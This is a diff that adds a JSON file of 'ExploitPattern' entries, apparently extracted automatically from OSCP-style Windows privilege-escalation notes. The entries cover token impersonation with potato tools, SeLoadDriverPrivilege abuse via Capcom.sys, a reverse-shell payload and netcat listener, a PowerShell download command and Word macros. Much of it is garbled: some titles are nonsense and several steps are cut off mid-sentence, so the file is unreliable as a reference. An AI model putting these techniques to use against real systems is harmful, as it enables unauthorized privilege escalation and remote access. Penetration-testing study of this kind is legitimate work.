@@ -1,0 +1,89 @@
+[
+  {
+    "id": "privesc-55",
+    "type": "ExploitPattern",
+    "category": "PRIVESC",
+    "title": "Check if the content of rev.bat is correct or send it from our host.",
+    "description": "whoami /all (privileges information) SeImpersonatePrivilege = Enabled Privilege Name                Description                               State ============================= ========================================= ======== SeTcbPrivilege                Act as part of the operating system       Disabled SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled SeImpersonatePrivilege        Impersonate a client after authentication Enabled SeCreateGlobalPrivilege       Create global objects                     Enabled",
+    "techniques": [
+      "Privilege Name                Description                               State",
+      "============================= ========================================= ========",
+      "SeTcbPrivilege                Act as part of the operating system       Disabled",
+      "SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled",
+      "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+      "SeCreateGlobalPrivilege       Create global objects                     Enabled",
+      "SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled",
+      "Tool:[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)",
+      "[JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)",
+      "[CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)",
+      "[JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)"
+    ],
+    "indicators": [],
+    "tags": [
+      "windows_ad",
+      "privesc"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "privesc-56",
+    "type": "ExploitPattern",
+    "category": "PRIVESC",
+    "title": "Disabled:1",
+    "description": "https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/ - version  LPORT= -f exe -o rev.exe https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys download eoploaddriver.cpp and compile https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp create a new project (Visual Studio 2022 Community Edition) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_1.png) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_2.png)",
+    "techniques": [
+      "version  LPORT= -f exe -o rev.exe",
+      "download Capcom.sys",
+      "download eoploaddriver.cpp and compile",
+      "create a new project (Visual Studio 2022 Community Edition)",
+      "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_1.png)",
+      "change project name",
+      "copy and paste the contents of the",
+      "configure project to target platforms",
+      "build project",
+      "executable file default location",
+      "download ExploitCapcom project and compile",
+      "Execute original file will pop up an additional window. The code must be modified to run the reverse shell payload.",
+      "upload the files we need on the target",
+      "execute the",
+      "C:\\Windows\\Temp\\eoploaddriver.exe System\\CurrentControlSet\\dfserv C:\\Windows\\Temp\\Capcom.sys",
+      "sudo nc -nlvp 80"
+    ],
+    "indicators": [],
+    "tags": [
+      "windows_ad",
+      "privesc"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "execution-57",
+    "type": "ExploitPattern",
+    "category": "EXECUTION",
+    "title": "powershell download cmd",
+    "description": "PowerShell -c \"(new-object System.Net.WebClient).DownloadFile('http://192.168.0.1/test.txt', 'C:\\Users\\user\\Desktop\\test.txt')\"",
+    "techniques": [
+      "PowerShell -c \"(new-object System.Net.WebClient).DownloadFile('http://192.168.0.1/test.txt', 'C:\\Users\\user\\Desktop\\test.txt')\""
+    ],
+    "indicators": [],
+    "tags": [
+      "windows_ad",
+      "execution"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "privesc-58",
+    "type": "ExploitPattern",
+    "category": "PRIVESC",
+    "title": "word",
+    "description": "Save our word file as doc format. ![image](../Pic/Windows/20230120_11h20m41s_001.png) ![image](../Pic/Windows/20230120_11h21m55s_002.png) ![image](../Pic/Windows/20230120_11h23m02s_003.png) Write the macros we need to execute in the `ThisDocument` section. ![image](../Pic/Windows/20230120_11h39m32s_004.png)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "windows_ad",
+      "privesc"
+    ],
+    "confidence": 0.5
+  }
+]
